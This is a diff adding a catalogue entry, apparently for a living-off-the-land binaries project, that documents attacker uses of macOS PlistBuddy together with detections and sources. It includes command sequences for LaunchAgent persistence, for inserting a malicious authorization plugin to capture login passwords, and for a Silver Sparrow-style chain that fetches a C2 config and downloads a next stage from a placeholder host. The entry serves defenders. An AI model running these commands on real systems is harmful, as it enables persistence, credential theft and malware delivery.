@@ -1,0 +1,119 @@
+name: PlistBuddy
+author: Hare Sudhan (@cyb3rbuff)
+short_description: Read and write property list values one key at a time from the command line.
+full_description: PlistBuddy is an Apple-supplied utility for reading and modifying property lists. It is normally driven interactively, but the -c switch executes a single Add, Set, Print, Delete, Copy, Merge, Import or Clear command and exits, which makes it scriptable. Entries are addressed by colon-delimited key paths with zero-based array indices, so a caller can construct or read an arbitrarily nested plist without ever handling a complete plist file. That property is what makes it useful to an attacker - a LaunchAgent can be assembled key by key in place instead of being copied in from a download, a downloaded configuration blob can be queried for a single value, and live system state piped in on /dev/stdin can be parsed without writing a temporary file. PlistBuddy has been observed in Silver Sparrow, UpdateAgent and the DPRK-attributed SILENCELIFT backdoor.
+created: 2026-09-20
+example_use_cases:
+  - name: Build a LaunchAgent or LaunchDaemon key by key for persistence
+    description: PlistBuddy creates the target file when it does not already exist, so a series of Add commands can assemble a complete launchd job in place. No plist is copied in from a disk image or archive, so the resulting file carries no com.apple.quarantine attribute and never existed as a signaturable artifact on the delivery medium. Red Canary observed exactly this sequence in Silver Sparrow's installer script, and Microsoft reported UpdateAgent using PlistBuddy to write LaunchAgent plists. Writing to ~/Library/LaunchAgents needs only the current user's privileges; /Library/LaunchAgents and /Library/LaunchDaemons require root. Note the trade-off Red Canary highlights - every key and value appears in the process command line, so a product with command-line telemetry sees more of the payload this way than it would from a plain file copy.
+    code: |-
+      /usr/libexec/PlistBuddy -c "Add :Label string <LABEL>" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :RunAtLoad bool true" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :StartInterval integer 3600" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :ProgramArguments array" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string /bin/sh" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :ProgramArguments:1 string -c" ~/Library/LaunchAgents/<LABEL>.plist
+      /usr/libexec/PlistBuddy -c "Add :ProgramArguments:2 string <PAYLOAD_PATH>" ~/Library/LaunchAgents/<LABEL>.plist
+    tactics:
+      - Persistence
+      - Defense Evasion
+    tags:
+      - plist
+  - name: Export an authorization right to a plist for editing
+    description: macOS authorization rights are stored as plists in the authorization database. An attacker who intends to insert a malicious SecurityAgent plugin into the mechanism list for system.login.console first exports that right with the security tool's authorizationdb read verb, writing it to a plist in a temporary directory where it can be edited offline. Reading the right requires no privileges.
+    code: security authorizationdb read system.login.console > /tmp/system.login.console.plist
+    tactics:
+      - Credential Access
+      - Persistence
+    tags: []
+  - name: Insert a malicious authorization plugin mechanism into an exported right
+    description: With the system.login.console right exported to a plist, PlistBuddy inserts an attacker-installed SecurityAgent plugin bundle as a mechanism at a chosen array index. Once the modified right is written back, the plugin is invoked at login and receives the username and password supplied to the login window. The PlistBuddy step itself needs no privileges because it edits a file in a temporary directory; installing the plugin bundle under /Library/Security/SecurityAgentPlugins requires root. Documented by Chris Ross (@xorrior).
+    code: /usr/libexec/PlistBuddy -c "Add :mechanisms:0 string <BUNDLE_NAME>:login,privileged" /tmp/system.login.console.plist
+    tactics:
+      - Credential Access
+      - Persistence
+    tags: []
+  - name: Write a modified authorization right back to the authorization database
+    description: After PlistBuddy inserts the malicious mechanism into the exported system.login.console plist, the modified right is written back into the authorization database with security authorizationdb write, taking effect for future logins. This step requires root. Documented by Chris Ross (@xorrior).
+    code: sudo security authorizationdb write system.login.console < /tmp/system.login.console.plist
+    tactics:
+      - Credential Access
+      - Persistence
+    tags: []
+  - name: Parse live I/O Kit registry output from stdin to read screen lock state
+    description: PlistBuddy accepts /dev/stdin as its file argument, so a plist produced by another command can be queried without ever touching disk. Google Threat Intelligence Group's report on UNC1069 records the SILENCELIFT backdoor using this exact construction to read :IOConsoleUsers:0:CGSSessionScreenIsLocked from ioreg output; the resulting lock screen status is beaconed to the C2 server alongside the victim's unique ID. Because the key is absent when the screen is unlocked, PlistBuddy exits non-zero and the error is discarded to /dev/null. No privileges are required.
+    code: '/usr/libexec/PlistBuddy -c "print :IOConsoleUsers:0:CGSSessionScreenIsLocked" /dev/stdin 2>/dev/null <<< "$(ioreg -n Root -d1 -a)"'
+    tactics:
+      - Discovery
+      - Collection
+    tags:
+      - lockscreen
+  - name: Fetch a remote JSON configuration file with curl
+    description: Silver Sparrow's hourly LaunchAgent fetched a JSON configuration file from its C2 server as the first step before parsing it for next-stage instructions. Keeping the C2 configuration in a data file fetched over plain HTTPS means the parsing logic never appears as attacker code, and changing the campaign's behaviour requires only a server-side edit. No privileges are required.
+    code: curl -s <C2_URL>/ver.json -o /tmp/version.json
+    tactics:
+      - Command and Control
+    tags:
+      - configuration
+  - name: Convert a fetched JSON configuration to a plist with plutil
+    description: Once Silver Sparrow's JSON configuration was retrieved, plutil converted it to a plist so its properties could be queried with PlistBuddy rather than a JSON parser. This step requires no privileges.
+    code: plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist
+    tactics:
+      - Command and Control
+    tags:
+      - configuration
+  - name: Read a downloadUrl key with PlistBuddy and fetch the next stage
+    description: With the configuration converted to a plist, PlistBuddy Print pulls the next-stage URL out of :downloadUrl, and the result is substituted directly into a curl command that fetches the next-stage payload. Reading individual properties out of a signed Apple binary's output rather than an attacker-authored parser keeps the parsing logic off the host. No privileges are required.
+    code: curl "$(/usr/libexec/PlistBuddy -c "Print :downloadUrl" /tmp/version.plist)" --output /tmp/<STAGE_TWO>
+    tactics:
+      - Command and Control
+    tags: []
+  - name: Read an installed application's marketing version from its Info.plist
+    description: Every application bundle carries an Info.plist with its version strings. Reading CFBundleShortVersionString reports the user-facing version of installed security tooling or another target application, supporting T1518 Software Discovery. Reading bundles under /Applications requires no privileges and no TCC grant.
+    code: /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /Applications/<APP>.app/Contents/Info.plist
+    tactics:
+      - Discovery
+    tags: []
+  - name: Read an installed application's build version from its Info.plist
+    description: CFBundleVersion reports the application's internal build number. An attacker can use it to distinguish builds that share a marketing version when fingerprinting installed software. Reading bundles under /Applications requires no privileges and no TCC grant.
+    code: /usr/libexec/PlistBuddy -c "Print :CFBundleVersion" /Applications/<APP>.app/Contents/Info.plist
+    tactics:
+      - Discovery
+    tags: []
+paths:
+  - /usr/libexec/PlistBuddy
+detections:
+  - name: "Sigma: Potential Persistence Via PlistBuddy - PlistBuddy command lines containing RunAtLoad, true and a LaunchAgents or LaunchDaemons path"
+    url: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml
+  - name: "Sigma: Suspicious Execution via macOS Script Editor - flags PlistBuddy spawned as a child of Script Editor"
+    url: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_susp_execution_macos_script_editor.yml
+  - name: "Elastic: Launch Service Creation and Immediate Loading - correlates a launch agent file write with a launchctl load or bootstrap within 30 seconds, which catches the PlistBuddy build-then-load sequence"
+    url: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/persistence_creation_change_launch_agents_file
+  - name: "Command Line Argument Detection: PlistBuddy invoked with /dev/stdin as its file argument, which indicates a plist is being parsed from a pipe rather than from disk"
+    url: N/A
+  - name: "Command Line Argument Detection: PlistBuddy adding an entry under :mechanisms, especially when followed by security authorizationdb write against a system.login.* right"
+    url: N/A
+  - name: "Process Lineage Detection: PlistBuddy executed as a descendant of installer or of a package post-install script, as observed during Silver Sparrow installation"
+    url: N/A
+resources:
+  - name: "Clipping Silver Sparrow's wings: Outing macOS malware before it takes flight"
+    url: https://redcanary.com/blog/clipping-silver-sparrows-wings/
+  - name: "The evolution of a Mac trojan: UpdateAgent's progression"
+    url: https://www.microsoft.com/en-us/security/blog/2022/02/02/the-evolution-of-a-mac-trojan-updateagents-progression/
+  - name: Persistent Credential Theft with Authorization Plugins
+    url: https://xorrior.com/persistent-credential-theft/
+  - name: UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering
+    url: https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering
+  - name: "Silver Sparrow: A new macOS malware"
+    url: https://www.jamf.com/blog/silver-sparrow-mac-specific-malware/
+  - name: "Atomic Red Team T1518 - Software Discovery"
+    url: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md
+  - name: "MITRE ATT&CK T1543.001 - Create or Modify System Process: Launch Agent"
+    url: https://attack.mitre.org/techniques/T1543/001/
+  - name: PlistBuddy(8) manual page
+    url: https://keith.github.io/xcode-man-pages/PlistBuddy.8.html
+acknowledgements:
+  - Tony Lambert and Red Canary (Silver Sparrow analysis and the PlistBuddy LaunchAgent sequence)
+  - Chris Ross (@xorrior) (authorization plugin credential theft technique)
+  - Google Threat Intelligence Group (SILENCELIFT / UNC1069 analysis)
+  - Sohan G (D4rkCiph3r) (Sigma rule for PlistBuddy persistence)
